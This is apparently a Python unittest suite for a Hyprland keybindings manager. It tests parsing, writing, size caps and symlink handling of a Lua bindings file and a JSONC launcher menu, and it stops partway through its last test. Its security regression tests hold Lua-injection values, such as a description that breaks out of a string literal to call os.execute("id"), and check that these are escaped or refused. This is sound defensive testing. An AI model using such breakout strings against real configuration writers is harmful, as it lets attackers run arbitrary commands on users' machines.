#!/usr/bin/env python3
import unittest
import os
import sys
import tempfile
import threading
import json
import shutil

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "backend")))
import keybinds_manager


class TestKeybindsBackend(unittest.TestCase):

    def test_normalize_key_chord(self):
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + A"), "SUPER + A")
        self.assertEqual(keybinds_manager.normalize_key_chord("CTRL + ALT + DELETE"), "CTRL + ALT + DELETE")
        self.assertEqual(keybinds_manager.normalize_key_chord("ctrl+a"), "CTRL + A")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER+SHIFT+RETURN"), "SUPER + SHIFT + RETURN")
        self.assertEqual(keybinds_manager.normalize_key_chord("SHIFT+SUPER+ctrl+w"), "SUPER + SHIFT + CTRL + W")
        self.assertEqual(keybinds_manager.normalize_key_chord("XF86AudioMute"), "XF86AudioMute")

    def test_parse_default_bindings(self):
        binds = keybinds_manager.parse_default_bindings()
        self.assertGreater(len(binds), 20)
        keys = [b["key"] for b in binds]
        self.assertIn("SUPER + RETURN", keys)
        self.assertIn("SUPER + SPACE", keys)

    def test_skip_comments_in_user_bindings(self):
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        try:
            old_path = keybinds_manager.USER_BINDINGS_PATH
            keybinds_manager.USER_BINDINGS_PATH = tmp_path

            # Write commented out lines
            with open(tmp_path, "w") as f:
                f.write('-- hl.unbind("SUPER + SHIFT + B")\n-- o.bind("SUPER + X", "Test", "test-cmd")\n')

            parsed = keybinds_manager.parse_user_bindings()
            self.assertNotIn("SUPER + SHIFT + B", parsed["unbinds"])
            self.assertEqual(len(parsed["binds"]), 0)

        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_write_user_bindings_oversized_file_refused(self):
        # Same defect class as the menu cap (round-2 filesystem review): the
        # text-mode read(n) counted CHARACTERS, so a >64 KiB bindings file was
        # silently truncated on edit — the tail lost in BOTH the rewrite and
        # the .bak. Byte-exact cap refuses instead of destroying data.
        old_path = keybinds_manager.USER_BINDINGS_PATH
        tmp = tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua")
        tmp.close()
        try:
            keybinds_manager.USER_BINDINGS_PATH = tmp.name
            original = "-- pad\n-- " + ("a" * 70000) + "\n"   # >64 KiB bytes+chars
            with open(tmp.name, "w", encoding="utf-8") as f:
                f.write(original)
            with open(tmp.name, "rb") as f:
                raw_before = f.read()
            self.assertGreater(len(raw_before), keybinds_manager.MAX_FILE_BYTES)
            with self.assertRaises(ValueError):
                keybinds_manager.write_user_bindings(
                    lines_to_add=[{"key": "SUPER + Z", "description": "X",
                                   "command": "x"}],
                    unbinds_to_add=["SUPER + Z"])
            with open(tmp.name, "rb") as f:
                self.assertEqual(f.read(), raw_before)   # no truncating rewrite
        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp.name):
                os.unlink(tmp.name)

    def test_write_and_parse_user_bindings(self):
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        try:
            old_path = keybinds_manager.USER_BINDINGS_PATH
            keybinds_manager.USER_BINDINGS_PATH = tmp_path

            # Initial state
            with open(tmp_path, "w") as f:
                f.write('-- Header\n-- [[ OMARCHY_MOUSE_BINDINGS_START ]]\no.bind("mouse:275", "Prev", "prev_ws")\n-- [[ OMARCHY_MOUSE_BINDINGS_END ]]\n')

            # Add a binding
            keybinds_manager.write_user_bindings(
                lines_to_add=[{"key": "SUPER + SHIFT + Z", "description": "Custom Tool", "command": "my-tool"}],
                unbinds_to_add=["SUPER + SHIFT + Z"]
            )

            parsed = keybinds_manager.parse_user_bindings()
            self.assertIn("SUPER + SHIFT + Z", parsed["unbinds"])
            self.assertTrue(any(b["key"] == "SUPER + SHIFT + Z" and b["description"] == "Custom Tool" for b in parsed["binds"]))

            # Verify mouse bindings preserved
            with open(tmp_path, "r") as f:
                content = f.read()
            self.assertIn("OMARCHY_MOUSE_BINDINGS_START", content)
            self.assertIn("mouse:275", content)

            # Remove the binding
            keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + SHIFT + Z"])
            parsed_after = keybinds_manager.parse_user_bindings()
            self.assertNotIn("SUPER + SHIFT + Z", parsed_after["unbinds"])
            self.assertFalse(any(b["key"] == "SUPER + SHIFT + Z" for b in parsed_after["binds"]))

        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_parse_bind_line_roundtrip(self):
        """Verify actions with nested parens/braces survive parsing."""
        cases = [
            ('o.bind("SUPER + LEFT", "Focus Left", hl.dsp.focus.left())',
             "SUPER + LEFT", "Focus Left", "hl.dsp.focus.left()"),
            ('o.bind("SUPER + SHIFT + LEFT", "Move Left", hl.dsp.window.move({ direction = "left" }))',
             "SUPER + SHIFT + LEFT", "Move Left", 'hl.dsp.window.move({ direction = "left" })'),
            ('o.bind("SUPER + T", "Toggle Float", hl.dsp.window.float({ action = "toggle" }))',
             "SUPER + T", "Toggle Float", 'hl.dsp.window.float({ action = "toggle" })'),
            ('o.bind("SUPER + J", "Toggle Split", hl.dsp.layout("togglesplit"))',
             "SUPER + J", "Toggle Split", 'hl.dsp.layout("togglesplit")'),
            ('o.bind("SUPER + TAB", "Next WS", hl.dsp.focus({ workspace = "e+1" }))',
             "SUPER + TAB", "Next WS", 'hl.dsp.focus({ workspace = "e+1" })'),
            ('o.bind("SUPER + S", "Scratch", hl.dsp.special_workspace.focus({ name = "scratchpad" }))',
             "SUPER + S", "Scratch", 'hl.dsp.special_workspace.focus({ name = "scratchpad" })'),
            ('o.bind_toggle("SUPER + F5", "Toggle Bar", hl.dsp.bar.toggle())',
             "SUPER + F5", "Toggle Bar", "hl.dsp.bar.toggle()"),
            ('o.bind("SUPER + K", "Menu", "exec")',
             "SUPER + K", "Menu", '"exec"'),
        ]
        for line, exp_key, exp_desc, exp_action in cases:
            result = keybinds_manager._parse_bind_line(line)
            self.assertIsNotNone(result, f"Failed to parse: {line}")
            key, desc, action, opts = result
            self.assertEqual(key, exp_key, f"Key mismatch for: {line}")
            self.assertEqual(desc, exp_desc, f"Desc mismatch for: {line}")
            self.assertEqual(action, exp_action, f"Action mismatch for: {line}")

    def test_write_and_reparse_preserves_parens(self):
        """Write catalog dispatchers to file, reparse, verify actions intact."""
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        try:
            old_path = keybinds_manager.USER_BINDINGS_PATH
            keybinds_manager.USER_BINDINGS_PATH = tmp_path

            with open(tmp_path, "w") as f:
                f.write('')

            dispatchers = [
                ("SUPER + W", "Close", "hl.dsp.window.close()"),
                ("SUPER + F", "Fullscreen", "hl.dsp.window.fullscreen()"),
                ("SUPER + ALT + F", "Full Width", "hl.dsp.window.fullwidth()"),
                ("SUPER + T", "Float", 'hl.dsp.window.float({ action = "toggle" })'),
                ("SUPER + J", "Split", 'hl.dsp.layout("togglesplit")'),
                ("SUPER + LEFT", "Focus L", "hl.dsp.focus.left()"),
                ("SUPER + SHIFT + LEFT", "Move L", 'hl.dsp.window.move({ direction = "left" })'),
                ("SUPER + TAB", "Next WS", 'hl.dsp.focus({ workspace = "e+1" })'),
                ("SUPER + S", "Scratch", 'hl.dsp.special_workspace.focus({ name = "scratchpad" })'),
                ("SUPER + ALT + S", "Move to Scratch", 'hl.dsp.special_workspace.move_window({ name = "scratchpad" })'),
            ]

            binds = [{"key": k, "description": d, "command": "", "action": a} for k, d, a in dispatchers]
            keybinds_manager.write_user_bindings(
                lines_to_add=binds,
                unbinds_to_add=[k for k, _, _ in dispatchers]
            )

            parsed = keybinds_manager.parse_user_bindings()
            self.assertEqual(len(parsed["binds"]), len(dispatchers))

            for i, (k, d, a) in enumerate(dispatchers):
                self.assertEqual(parsed["binds"][i]["action"], a,
                    f"Action mismatch for {k}: got {parsed['binds'][i]['action']!r}")

        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_swap_two_keybindings_preserves_first(self):
        """Swapping two bindings' keys must keep the first binding's freshly written line.
        Regression for issue #11 -- the second edit's old_key equals the key the first
        edit just bound to, and key-only removal was dropping it as collateral."""
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        orig_defaults = keybinds_manager.parse_default_bindings
        orig_reload = keybinds_manager.reload_hyprland
        orig_path = keybinds_manager.USER_BINDINGS_PATH
        try:
            keybinds_manager.USER_BINDINGS_PATH = tmp_path
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + F", "description": "Full screen",
                 "action": 'hl.dsp.window.fullscreen({ mode = "fullscreen" })'},
                {"key": "SUPER + ALT + F", "description": "Full width",
                 "action": 'hl.dsp.window.fullscreen({ mode = "maximized" })'},
            ]
            keybinds_manager.reload_hyprland = lambda: {"success": True, "reload_output": "", "config_errors": ""}

            with open(tmp_path, "w") as f:
                f.write("")

            # Step 2: move "Full screen" SUPER + F -> SUPER + ALT + F
            keybinds_manager.set_keybinding(
                key="SUPER + ALT + F", description="Full screen", command="",
                action='hl.dsp.window.fullscreen({ mode = "fullscreen" })', old_key="SUPER + F",
                old_description="Full screen",
                old_action='hl.dsp.window.fullscreen({ mode = "fullscreen" })')
            # Step 3: move "Full width" SUPER + ALT + F -> SUPER + F (the swap)
            keybinds_manager.set_keybinding(
                key="SUPER + F", description="Full width", command="",
                action='hl.dsp.window.fullscreen({ mode = "maximized" })', old_key="SUPER + ALT + F",
                old_description="Full width",
                old_action='hl.dsp.window.fullscreen({ mode = "maximized" })')

            with open(tmp_path) as f:
                content = f.read()

            self.assertIn('o.bind("SUPER + ALT + F", "Full screen"', content)
            self.assertIn('mode = "fullscreen"', content)
            self.assertIn('o.bind("SUPER + F", "Full width"', content)
            self.assertIn('mode = "maximized"', content)
        finally:
            keybinds_manager.USER_BINDINGS_PATH = orig_path
            keybinds_manager.parse_default_bindings = orig_defaults
            keybinds_manager.reload_hyprland = orig_reload
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_in_place_action_edit_removes_old_line(self):
        """Editing a binding's action in place (same key, same description, new
        action) must replace the old o.bind line, not leave a stale one behind.
        Guards the preserve_entry identity match against matching on the NEW
        action, which would wrongly keep the old line."""
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        orig_defaults = keybinds_manager.parse_default_bindings
        orig_reload = keybinds_manager.reload_hyprland
        orig_path = keybinds_manager.USER_BINDINGS_PATH
        try:
            keybinds_manager.USER_BINDINGS_PATH = tmp_path
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + F", "description": "Full screen",
                 "action": 'hl.dsp.window.fullscreen({ mode = "fullscreen" })'},
            ]
            keybinds_manager.reload_hyprland = lambda: {"success": True, "reload_output": "", "config_errors": ""}

            with open(tmp_path, "w") as f:
                f.write("")

            # First write with action A
            keybinds_manager.set_keybinding(
                key="SUPER + F", description="Full screen", command="",
                action='hl.dsp.window.fullscreen({ mode = "fullscreen" })', old_key="SUPER + F")
            # In-place edit: same key + description, new action
            keybinds_manager.set_keybinding(
                key="SUPER + F", description="Full screen", command="",
                action='hl.dsp.window.fullscreen({ mode = "maximized" })', old_key="SUPER + F")

            with open(tmp_path) as f:
                content = f.read()

            # Old action must be gone; exactly one Full screen bind, with the new action
            self.assertNotIn('mode = "fullscreen"', content)
            self.assertIn('o.bind("SUPER + F", "Full screen"', content)
            self.assertIn('mode = "maximized"', content)
            fullscreen_binds = [l for l in content.splitlines()
                                if l.strip().startswith('o.bind("SUPER + F"')]
            self.assertEqual(len(fullscreen_binds), 1)
        finally:
            keybinds_manager.USER_BINDINGS_PATH = orig_path
            keybinds_manager.parse_default_bindings = orig_defaults
            keybinds_manager.reload_hyprland = orig_reload
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_write_user_bindings_preserves_symlink(self):
        """Dotfile-managed bindings.lua may be a symlink; writes must update the
        target and keep the symlink intact (PR #21 review)."""
        with tempfile.TemporaryDirectory() as td:
            target = os.path.join(td, "dotfiles", "bindings.lua")
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "w", encoding="utf-8") as f:
                f.write("-- original\n")

            link_dir = os.path.join(td, "config", "hypr")
            os.makedirs(link_dir, exist_ok=True)
            link = os.path.join(link_dir, "bindings.lua")
            os.symlink(target, link)

            old_path = keybinds_manager.USER_BINDINGS_PATH
            try:
                keybinds_manager.USER_BINDINGS_PATH = link
                keybinds_manager.write_user_bindings(
                    lines_to_add=[{"key": "SUPER + Z", "description": "Test",
                                   "command": "my-tool"}],
                    unbinds_to_add=["SUPER + Z"])

                self.assertTrue(os.path.islink(link))
                self.assertEqual(os.path.realpath(link), os.path.realpath(target))
                with open(target, "r", encoding="utf-8") as f:
                    target_content = f.read()
                self.assertIn('o.bind("SUPER + Z", "Test", "my-tool")', target_content)
                with open(link, "r", encoding="utf-8") as f:
                    link_content = f.read()
                self.assertEqual(link_content, target_content)
                self.assertTrue(os.path.isfile(target + ".bak"))
            finally:
                keybinds_manager.USER_BINDINGS_PATH = old_path

    def test_get_installed_apps(self):
        apps = keybinds_manager.get_installed_apps()
        self.assertIsInstance(apps, list)
        if apps:
            first = apps[0]
            self.assertIn("name", first)
            self.assertIn("exec", first)
            self.assertIn("icon", first)
            self.assertIn("terminal", first)
            # Verify alphabetical ordering
            names = [a["name"].lower() for a in apps]
            self.assertEqual(names, sorted(names))

    def test_expanded_catalog(self):
        catalog_ids = {p["id"] for p in keybinds_manager.PRESET_CATALOG}
        self.assertIn("ws.switch_1", catalog_ids)
        self.assertIn("ws.switch_10", catalog_ids)
        self.assertIn("ws.move_1", catalog_ids)
        self.assertIn("win.swap_left", catalog_ids)
        self.assertIn("media.play_pause", catalog_ids)
        self.assertIn("media.brightness_up", catalog_ids)

    def test_normalize_key_chord_punctuation(self):
        """Verify commas, pluses, and punctuation keys are preserved."""
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + ,"), "SUPER + comma")
        self.assertEqual(keybinds_manager.normalize_key_chord("CTRL + +"), "CTRL + plus")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + comma"), "SUPER + comma")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + COMMA"), "SUPER + comma")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + ."), "SUPER + period")

    def test_sanitize_lua_str_max_len(self):
        """Verify sanitize_lua_str respects max_len parameter."""
        long_cmd = "echo " + ("a" * 500)
        default_sanitized = keybinds_manager.sanitize_lua_str(long_cmd)
        self.assertEqual(len(default_sanitized), keybinds_manager.MAX_TEXT_LEN)
        cmd_sanitized = keybinds_manager.sanitize_lua_str(long_cmd, max_len=keybinds_manager.MAX_CMD_LEN)
        self.assertEqual(len(cmd_sanitized), len(long_cmd))

    def test_preset_catalog_valid_dispatchers(self):
        """Verify no non-existent hierarchical function paths exist in catalog."""
        invalid_patterns = ["hl.dsp.focus.left", "hl.dsp.focus.right", "hl.dsp.focus.up", "hl.dsp.focus.down",
                            "hl.dsp.window.fullwidth", "hl.dsp.special_workspace"]
        for preset in keybinds_manager.PRESET_CATALOG:
            dsp = preset.get("dispatcher", "")
            for pat in invalid_patterns:
                self.assertNotIn(pat, dsp, f"Invalid dispatcher pattern '{pat}' in preset {preset['id']}")

    def test_new_presets_included(self):
        catalog_ids = {p["id"] for p in keybinds_manager.PRESET_CATALOG}
        self.assertIn("mon.focus_next", catalog_ids)
        self.assertIn("mon.move_ws_left", catalog_ids)
        self.assertIn("win.pin", catalog_ids)
        self.assertIn("ws.previous_history", catalog_ids)


class TestMenuEntry(unittest.TestCase):
    """Launcher-menu install/remove/check must never destroy or silently skip
    the user's omarchy-menu.jsonc (marketplace finding #13661)."""

    def setUp(self):
        self._tmpdir = tempfile.TemporaryDirectory()
        self._saved_path = keybinds_manager.MENU_CONFIG_PATH
        keybinds_manager.MENU_CONFIG_PATH = os.path.join(
            self._tmpdir.name, "omarchy-menu.jsonc")

    def tearDown(self):
        keybinds_manager.MENU_CONFIG_PATH = self._saved_path
        self._tmpdir.cleanup()

    def _write(self, content):
        with open(keybinds_manager.MENU_CONFIG_PATH, "w", encoding="utf-8") as f:
            f.write(content)

    def _read_bytes(self):
        with open(keybinds_manager.MENU_CONFIG_PATH, "rb") as f:
            return f.read()

    def _load(self):
        import json
        return json.loads(keybinds_manager._strip_jsonc_comments(
            self._read_bytes().decode("utf-8")))

    # -- the #13661 clobber -------------------------------------------------

    def test_menu_install_preserves_url_entries(self):
        self._write(
            '{\n'
            '  "other.site": {"label": "Site", "action": "https://example.com/a"},\n'
            '  "another.one": {"label": "Two", "action": "https://two.example/x"},\n'
            '  "third.one": {"label": "Three", "action": "https://three.example/y"}\n'
            '}\n')
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("other.site", data)
        self.assertIn("another.one", data)
        self.assertIn("third.one", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)
        self.assertEqual(data["other.site"]["action"], "https://example.com/a")

    def test_menu_install_unparseable_file_is_not_written(self):
        original = b"{{{ this is not json at all"
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("message", res)
        self.assertIn("error", res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_non_object_top_level_refused(self):
        original = b'["not", "an", "object"]'
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()   # used to raise TypeError
        self.assertFalse(res.get("success"), res)
        self.assertIn("message", res)
        # Pin the diagnostic, not just the failure: the broad except would
        # otherwise mask this guard (mutation sweep: "top-level must be object").
        self.assertIn("top level is not a JSON object", res["message"])
        self.assertEqual(self._read_bytes(), original)

    def test_menu_remove_unparseable_file_is_not_written(self):
        original = b"{{{ this is not json at all"
        self._write(original.decode("utf-8"))
        res = keybinds_manager.remove_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("message", res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_remove_preserves_other_entries(self):
        self._write(
            '{\n'
            '  "other.site": {"label": "Site", "action": "https://example.com/a"},\n'
            f'  "{keybinds_manager.MENU_ENTRY_KEY}": {{"label": "KM", "action": "x"}}\n'
            '}\n')
        res = keybinds_manager.remove_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertNotIn(keybinds_manager.MENU_ENTRY_KEY, data)
        self.assertEqual(data["other.site"]["action"], "https://example.com/a")

    def test_menu_check_reports_failure_on_unparseable_file(self):
        self._write("{{{ not json")
        res = keybinds_manager.check_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertFalse(res.get("exists"))
        self.assertIn("message", res)

    def test_menu_check_happy_path_reports_entry(self):
        # The success contract had no test at all (review round): present ->
        # exists True, absent -> exists False, both with success True.
        self._write('{"other.site": {"label": "Site"}}\n')
        res = keybinds_manager.check_menu_entry()
        self.assertTrue(res.get("success"), res)
        self.assertFalse(res.get("exists"))
        self._write(json.dumps({keybinds_manager.MENU_ENTRY_KEY:
                                {"label": "KM", "action": "x"}}))
        res2 = keybinds_manager.check_menu_entry()
        self.assertTrue(res2.get("success"), res2)
        self.assertTrue(res2.get("exists"))

    # -- every menu path answers JSON (no empty stdout for the QML) ---------

    def test_menu_check_symlink_returns_json_not_exception(self):
        target = os.path.join(self._tmpdir.name, "real.jsonc")
        with open(target, "w", encoding="utf-8") as f:
            f.write("{}\n")
        link = keybinds_manager.MENU_CONFIG_PATH
        os.symlink(target, link)
        res = keybinds_manager.check_menu_entry()   # must not raise
        self.assertIsInstance(res, dict)
        self.assertFalse(res.get("success"))
        self.assertFalse(res.get("exists"))
        res2 = keybinds_manager.install_menu_entry()  # must not raise either
        self.assertFalse(res2.get("success"))
        self.assertIn("message", res2)

    def test_menu_install_write_failure_returns_json(self):
        self._write('{"other.site": {"label": "Site"}}\n')
        original = self._read_bytes()
        import unittest.mock
        with unittest.mock.patch.object(
                keybinds_manager, "_safe_atomic_write_file",
                side_effect=OSError("read-only filesystem")):
            res = keybinds_manager.install_menu_entry()   # must not raise
        self.assertFalse(res.get("success"))
        self.assertIn("message", res)
        self.assertEqual(self._read_bytes(), original)

    # -- string-aware JSONC scanner ----------------------------------------

    def test_strip_preserves_urls_escapes_and_comment_quotes(self):
        src = ('{\n'
               '  // a line comment with \'quotes\' and // slashes\n'
               '  "url": "https://example.com/a//b",\n'
               '  "win": "C:\\\\dir\\\\file",\n'
               '  "notcomment": "/* stays */ and // this too" /* real block // comment */\n'
               '}\n')
        import json
        data = json.loads(keybinds_manager._strip_jsonc_comments(src))
        self.assertEqual(data["url"], "https://example.com/a//b")
        self.assertEqual(data["win"], "C:\\dir\\file")
        self.assertEqual(data["notcomment"], "/* stays */ and // this too")

    def test_strip_block_comment_containing_slashes(self):
        import json
        src = '/* a // b \n c */ {"a": 1}'
        data = json.loads(keybinds_manager._strip_jsonc_comments(src))
        self.assertEqual(data, {"a": 1})

    def test_strip_line_comment_at_eof_without_newline_is_valid(self):
        import json
        data = json.loads(keybinds_manager._strip_jsonc_comments('{"a": 1} // tail'))
        self.assertEqual(data, {"a": 1})

    def test_strip_unterminated_string_raises(self):
        with self.assertRaises(ValueError):
            keybinds_manager._strip_jsonc_comments('{"a": "oops')

    def test_strip_unterminated_block_comment_raises(self):
        with self.assertRaises(ValueError):
            keybinds_manager._strip_jsonc_comments('{"a": 1} /* oops')

    def test_menu_install_refuses_unterminated_string(self):
        original = b'{"a": "oops'
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_refuses_unterminated_block_comment(self):
        original = b'{"a": 1} /* oops'
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_realistic_jsonc_fixture(self):
        self._write(
            '{\n'
            '  // Omarchy launcher entries\n'
            f'  "{keybinds_manager.MENU_ENTRY_KEY}": {{\n'
            '    "icon": "\uf464",\n'
            '    "label": "Keybindings Manager",\n'
            '    "action": "omarchy-shell shell summon meviusisback.keybinds"\n'
            '  },\n'
            '  "web.thing": {\n'
            '    "label": "Docs",\n'
            '    "action": "https://docs.example/guide//latest"  // trailing comment\n'
            '  }\n'
            '}\n')
        res = keybinds_manager.remove_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertNotIn(keybinds_manager.MENU_ENTRY_KEY, data)
        self.assertEqual(data["web.thing"]["action"],
                         "https://docs.example/guide//latest")

    def test_menu_install_line_comment_at_eof_is_valid(self):
        self._write('{"other.site": {"label": "Site"}} // note')  # no newline
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("other.site", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)

    # -- size cap: refuse oversized, accept exact-fit -----------------------

    def test_menu_install_oversized_file_refused(self):
        base = '{"other.site": {"label": "Site"}}'
        pad = keybinds_manager.MAX_FILE_BYTES + 1 - len(base)
        content = base + (" " * pad)
        self.assertEqual(len(content), keybinds_manager.MAX_FILE_BYTES + 1)
        self._write(content)
        original = self._read_bytes()
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("refus", res.get("message", "").lower())
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_multibyte_oversized_refused(self):
        # 40 000 two-byte chars = ~80 000 UTF-8 bytes but only 40 012
        # CHARACTERS: a text-mode cap (pre-fix) accepted this at 4x the
        # documented 64 KiB byte limit — three reviewers flagged it.
        content = '{"pad": "' + ("é" * 40000) + '"}'
        self.assertGreater(len(content.encode("utf-8")),
                           keybinds_manager.MAX_FILE_BYTES)
        self.assertLess(len(content), keybinds_manager.MAX_FILE_BYTES)
        self._write(content)
        original = self._read_bytes()
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("refus", res.get("message", "").lower())
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_multibyte_under_cap_accepted(self):
        self._write(json.dumps({"café.menu": {"label": "Café ☕",
                                              "action": "https://café.example/ünïcode"}}))
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("café.menu", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)

    def test_menu_install_exact_cap_file_accepted(self):
        base = '{"other.site": {"label": "Site"}}'
        pad = keybinds_manager.MAX_FILE_BYTES - len(base)
        content = base + (" " * pad)
        self.assertEqual(len(content), keybinds_manager.MAX_FILE_BYTES)
        self._write(content)
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("other.site", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)


class TestSecurityRegressions(unittest.TestCase):
    """2026-11 tree audit: the Lua-literal escapes, the backup safety net,
    statement-aware editing and the bounded readers were all unasserted — a
    guard-deletion sweep left the suite green while the plugin wrote unescaped
    Lua into the file Hyprland executes."""

    def setUp(self):
        self._tmpdir = tempfile.TemporaryDirectory()
        self._saved_path = keybinds_manager.USER_BINDINGS_PATH
        self.path = os.path.join(self._tmpdir.name, "bindings.lua")
        keybinds_manager.USER_BINDINGS_PATH = self.path

    def tearDown(self):
        keybinds_manager.USER_BINDINGS_PATH = self._saved_path
        self._tmpdir.cleanup()

    def _write(self, content):
        with open(self.path, "w", encoding="utf-8") as f:
            f.write(content)

    def _read(self):
        with open(self.path, "r", encoding="utf-8") as f:
            return f.read()

    def _read_backup(self):
        with open(self.path + ".bak", "r", encoding="utf-8") as f:
            return f.read()

    # -- Lua literal escaping ----------------------------------------------

    def test_sanitize_lua_str_escapes_literal_breakout(self):
        self.assertEqual(keybinds_manager.sanitize_lua_str('a"b'), r'a\"b')
        self.assertEqual(keybinds_manager.sanitize_lua_str("a\\b"), r"a\\b")
        self.assertEqual(keybinds_manager.sanitize_lua_str("a\nb\rc"), "a b c")

    def test_normalize_key_chord_rejects_lua_breakout(self):
        for chord in ['SUPER + A") --', "A)os.execute(1)", 'SUPER + "',
                      "A\nB", "X" * 80]:
            self.assertEqual(keybinds_manager.normalize_key_chord(chord), "",
                             f"chord survived normalization: {chord!r}")

    def test_set_keybinding_refuses_unsafe_key_without_writing(self):
        self._write("-- original\n")
        res = keybinds_manager.set_keybinding('SUPER + A") --', "x", "y")
        self.assertFalse(res["success"])
        self.assertEqual(self._read(), "-- original\n")

    def test_write_escapes_description_breakout(self):
        self._write("-- original\n")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + Z",
                           "description": 'x"); os.execute("id") --',
                           "command": "true"}],
            unbinds_to_add=["SUPER + Z"])
        content = self._read()
        self.assertEqual(content.count("o.bind"), 1)
        self.assertIn(
            r'o.bind("SUPER + Z", "x\"); os.execute(\"id\") --", "true")',
            content)
        reparsed = keybinds_manager.parse_user_bindings()["binds"]
        self.assertEqual(len(reparsed), 1)
        self.assertEqual(reparsed[0]["description"], 'x"); os.execute("id") --')

    def test_command_is_literal_action_is_dispatcher(self):
        # Raw Lua must come only from the explicit dispatcher field: a
        # .desktop Exec is untrusted data, and prefix-sniffing it as code let
        # `Exec=hl.…` inject statements into bindings.lua.
        self._write("-- original\n")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + X", "description": "Exec",
                           "command": 'hl.dsp.window.close()) os.execute("id") --'}])
        self.assertIn(
            r'"hl.dsp.window.close()) os.execute(\"id\") --"', self._read())
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + D", "description": "Close",
                           "command": "", "action": "hl.dsp.window.close()"}],
            keys_to_remove=["SUPER + D"])
        self.assertIn('o.bind("SUPER + D", "Close", hl.dsp.window.close())',
                      self._read())

    def test_long_bracket_action_roundtrip(self):
        # Long-string actions must keep their `[[ ]]` / `[==[ ]==]` delimiters:
        # dropping them turned the action into unquoted text on reparse.
        self._write('o.bind("SUPER + D", "D", [[raw ; ( " foo]])\n'
                    'o.bind("SUPER + L", "L", [==[raw ]] ( " bar]==])\n')
        binds = keybinds_manager.parse_user_bindings()["binds"]
        actions = {b["key"]: b["action"] for b in binds}
        self.assertEqual(actions["SUPER + D"], '[[raw ; ( " foo]]')
        self.assertEqual(actions["SUPER + L"], '[==[raw ]] ( " bar]==]')

    def test_long_string_content_is_not_a_binding(self):
        commented = '[[hl.unbind("SUPER + X")]]\n'
        self._write(commented)
        self.assertEqual(keybinds_manager.parse_user_bindings()["unbinds"], set())
        keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + X"])
        self.assertIn(commented.strip(), self._read())

    def test_escaped_newline_string_does_not_swallow_following_binds(self):
        # A backslash at end of line escapes the newline, not the first
        # character of the next line; leaking that state merged the rest of
        # the file into one unit and a targeted write deleted it.
        self._write('o.bind("SUPER + X", "X", "echo hi\\\n'
                    '")\n'
                    'o.bind("SUPER + Y", "Y", "keep")\n')
        keys = [b["key"] for b in keybinds_manager.parse_user_bindings()["binds"]]
